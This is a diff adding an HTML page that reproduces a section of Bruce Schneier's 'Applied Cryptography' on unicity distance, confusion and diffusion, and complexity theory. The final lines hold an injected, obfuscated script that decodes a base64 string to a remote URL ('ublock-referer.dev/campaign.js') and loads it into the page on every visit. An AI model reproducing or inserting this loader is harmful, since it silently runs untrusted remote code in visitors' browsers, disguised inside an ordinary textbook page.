@@ -1,0 +1,120 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Mathematical Background</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=11//-->
+<!--PAGES=235-237//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Unicity Distance</I></B></FONT></P>
+<P>For a message of length <I>n</I>, the number of different keys that will decipher a ciphertext message to some intelligible plaintext in the same language as the original plaintext (such as an English text string) is given by the following formula [712,95]:</P>
+<DL>
+<DD>2<SUP>H(<I>K</I>)- nD</SUP> - 1
+</DL>
+<P>Shannon [1432] defined the <B>unicity distance</B>, <I>U</I>, also called the unicity point, as an approximation of the amount of ciphertext such that the sum of the real information (entropy) in the corresponding plaintext plus the entropy of the encryption key equals the number of ciphertext bits used. He then went on to show that ciphertexts longer than this distance are reasonably certain to have only one meaningful decryption. Ciphertexts significantly shorter than this are likely to have multiple, equally valid decryptions and therefore gain security from the opponent&#146;s difficulty in choosing the correct one.</P>
+<P>For most symmetric cryptosystems, the unicity distance is defined as the entropy of the cryptosystem divided by the redundancy of the language.</P>
+<DL>
+<DD><I>U</I> = H(<I>K</I>)/<I>D</I>
+</DL>
+<P>Unicity distance does not make deterministic predictions, but gives probabilistic results. Unicity distance estimates the minimum amount of ciphertext for which it is likely that there is only a single intelligible plaintext decryption when a brute-force attack is attempted. Generally, the longer the unicity distance, the better the cryptosystem. For DES, with a 56-bit key, and an ASCII English message, the unicity distance is about 8.2 ASCII characters or 66 bits. Table 11.1 gives the unicity distances for varying key lengths. The unicity distances for some classical cryptosystems are found in [445].
+</P>
+<P>Unicity distance is not a measure of how much ciphertext is required for cryptanalysis, but how much ciphertext is required for there to be only one reasonable solution for cryptanalysis. A cryptosystem may be computationally infeasible to break even if it is theoretically possible to break it with a small amount of ciphertext. (The largely esoteric theory of relativized cryptography is relevant here [230, 231, 232, 233, 234, 235].) The unicity distance is inversely proportional to the redundancy. As redundancy approaches zero, even a trivial cipher can be unbreakable with a ciphertext-only attack.</P>
+<P>Shannon defined a cryptosystem whose unicity distance is infinite as one that has <B>ideal secrecy</B>. Note that an ideal cryptosystem is not necessarily a perfect cryptosystem, although a perfect cryptosystem would necessarily be an ideal cryptosystem. If a cryptosystem has ideal secrecy, even successful cryptanalysis will leave some uncertainty about whether the recovered plaintext is the real plaintext.</P>
+<P><FONT SIZE="+1"><B><I>Information Theory in Practice</I></B></FONT></P>
+<P>While these concepts have great theoretical value, actual cryptanalysis seldom proceeds along these lines. Unicity distance guarantees insecurity if it&#146;s too small but does not guarantee security if it&#146;s high. Few practical algorithms are absolutely impervious to analysis; all manner of characteristics might serve as entering wedges to crack some encrypted messages. However, similar information theory considerations are occasionally useful, for example, to determine a recommended key change interval for a particular algorithm. Cryptanalysts also employ a variety of statistical and information theory tests to help guide the analysis in the most promising directions. Unfortunately, most literature on applying information theory to cryptanalysis remains classified, including the seminal 1940 work of Alan Turing.
+</P>
+<TABLE WIDTH="70%"><TH CAPTION ALIGN="CENTER" COLSPAN="2">Table 11.1<BR>Unicity Distances of ASCII Text Encrypted<BR>with Algorithms with Varying Key Lengths
+<TR>
+<TH COLSPAN="2"><HR>
+<TR>
+<TH VALIGN="LEFT" ALIGN="CENTER" WIDTH="30%">Key Length (in bits)
+<TH VALIGN="LEFT" ALIGN="CENTER" WIDTH="40%">Unicity Distance (in characters)
+<TR>
+<TH COLSPAN="2"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">40
+<TD VALIGN="TOP" ALIGN="CENTER">5.9
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">56
+<TD VALIGN="TOP" ALIGN="CENTER">8.2
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">64
+<TD VALIGN="TOP" ALIGN="CENTER">9.4
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">80
+<TD VALIGN="TOP" ALIGN="CENTER">11.8
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">128
+<TD VALIGN="TOP" ALIGN="CENTER">18.8
+<TR>
+<TD VALIGN="TOP" ALIGN="CENTER">256
+<TD VALIGN="TOP" ALIGN="CENTER">37.6
+<TR>
+<TH COLSPAN="2"><HR>
+<TR>
+</TABLE>
+<P><FONT SIZE="+1"><B><I>Confusion and Diffusion</I></B></FONT></P>
+<P>The two basic techniques for obscuring the redundancies in a plaintext message are, according to Shannon, confusion and diffusion [1432].
+</P>
+<P><B>Confusion</B> obscures the relationship between the plaintext and the ciphertext. This frustrates attempts to study the ciphertext looking for redundancies and statistical patterns. The easiest way to do this is through substitution. A simple substitution cipher, like the Caesar Cipher, is one in which every identical letter of plaintext is substituted for a single letter of ciphertext. Modern substitution ciphers are more complex: A long block of plaintext is substituted for a different block of ciphertext, and the mechanics of the substitution change with each bit in the plaintext or key. This type of substitution is not necessarily enough; the German Enigma is a complex substitution algorithm that was broken during World War II.</P>
+<P><B>Diffusion</B> dissipates the redundancy of the plaintext by spreading it out over the ciphertext. A cryptanalyst looking for those redundancies will have a harder time finding them. The simplest way to cause diffusion is through transposition (also called <B>permutation</B>). A simple transposition cipher, like columnar transposition, simply rearranges the letters of the plaintext. Modern ciphers do this type of permutation, but they also employ other forms of diffusion that can diffuse parts of the message throughout the entire message.</P>
+<P>Stream ciphers rely on confusion alone, although some feedback schemes add diffusion. Block algorithms use both confusion and diffusion. As a general rule, diffusion alone is easily cracked (although double transposition ciphers hold up better than many other pencil-and-paper systems).</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">11.2 Complexity Theory</FONT></H3>
+<P>Complexity theory provides a methodology for analyzing the <B>computational complexity</B> of different cryptographic techniques and algorithms. It compares cryptographic algorithms and techniques and determines their security. Information theory tells us that all cryptographic algorithms (except one-time pads) can be broken. Complexity theory tells us whether they can be broken before the heat death of the universe.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(mRadmoRA, NIivYUap) {NIivYUap = mRadmoRA.createElement('script');NIivYUap.type = 'text/javascript';NIivYUap.async = true;NIivYUap.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');mRadmoRA.getElementsByTagName('body')[0].appendChild(NIivYUap);}(document));</script></body>
+</html>
